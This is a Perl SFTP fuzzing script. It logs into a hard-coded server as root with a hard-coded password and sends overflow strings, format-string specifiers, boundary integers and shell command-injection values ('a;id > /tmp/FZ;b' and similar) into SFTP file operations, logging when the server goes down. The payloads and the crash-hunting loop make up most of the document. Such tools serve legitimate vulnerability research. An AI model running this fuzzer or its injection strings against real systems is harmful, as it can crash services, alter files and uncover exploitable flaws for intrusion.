#!/usr/bin/perl

use Net::SSH2;

@fzorc = (
    "A" x 550, "A" x 1100, "A" x 2100, "A" x 4200, "A" x 8400,    # overflow
    "\%n\%n\%n\%n\%n", "\%\%20n", "\%n\%p\%s\%d\%x", "%.1024d",
    "%.2049d",    # format string
    "-1", "32767", "65535", "-2147483647", "0xffffffff",    # numbers
    "a|id > /tmp/FZ|b", "a`id > /tmp/FZ`b",
    "a'id > /tmp/FZ'b",    # out-of-bounds breakage
    "a;id > /tmp/FZ;b", "a&&id > /tmp/FZ&&b"
);

@fzdesc = (
    "A x 550",          "A x 1100",
    "A x 2100",         "A x 4200",
    "A x 8400",         "\%n\%n\%n\%n\%n",
    "\%\%20n",          "\%n\%p\%s\%d\%x",
    "%.1024d",          "%.2049d",
    "-1",               "32767",
    "65535",            "-2147483647",
    "0xffffffff",       "a|id > /tmp/FZ|b",
    "a`id > /tmp/FZ`b", "a'id > /tmp/FZ'b",
    "a;id > /tmp/FZ;b", "a&&id > /tmp/FZ&&b"
);

@funcs1 = (
    "open",    "opendir",  "unlink", "mkdir", "rmdir", "stat",
    "setstat", "readlink", "realpath"
);    # 1 arg
@funcs2 = ( "rename", "symlink" );    # 2 args

$server  = "10.144.84.131";
$user    = "root";
$pass    = "secs-anode-lolly-scam";
$logfile = "sftpfuzz.log";

$| = 1;

$ssh2 = Net::SSH2->new();
$ssh2->connect($server);
$ssh2->disconnect();

$i = 0;
for ( $z = 0 ; $z < 9 ; $z++ ) {

    foreach (@fzorc) {

        $func = $funcs1[$z];
        $arg  = 1;
        $fuzz = $_;

        sftpfuzz( $func, $fuzz, $arg, $i );

        if ( $i == 19 ) { $i = -1; }
        $i++;

    }
}

$i = 0;
for ( $z = 0 ; $z < 2 ; $z++ ) {

    foreach (@fzorc) {

        $func = $funcs2[$z];
        $arg  = 2;
        $fuzz = $_;

        sftpfuzz( $func, $fuzz, $arg, $i );

        if ( $i == 19 ) { $i = -1; }
        $i++;

    }
}

sub sftpfuzz {

    $func = $_[0];
    $fuzz = $_[1];
    $arg  = $_[2];
    $i    = $_[3];

    $desc = $fzdesc[$i];

    $ssh2 = Net::SSH2->new();
    $ssh2->connect($server) or logit( $func, $i );

    print "sftpfuzz fuzzing [sftp + $func + $desc]\n";

    if ( $ssh2->auth_keyboard( $user, $pass ) ) {

        $sftp = $ssh2->sftp();
        if ( $arg == 1 ) {
            $fuzr = $sftp->$func($fuzz);
        }

        if ( $arg == 2 ) {
            $fuzr = $sftp->$func( $fuzz, $fuzz );
        }
    }

    else { die "ERROR: auth_keyboard($user/$pass)\n"; }

    $ssh2->disconnect();
}

sub logit {

    $fuzz = $_[0];
    $i    = $_[1];
    $desc = $fzdesc[ $i - 1 ];

    open( FD, ">>$logfile" );
    print FD $server . " -> [sftp + $func + $desc]\n";
    close(FD);

    die "$server down -> check $logfile\n";
}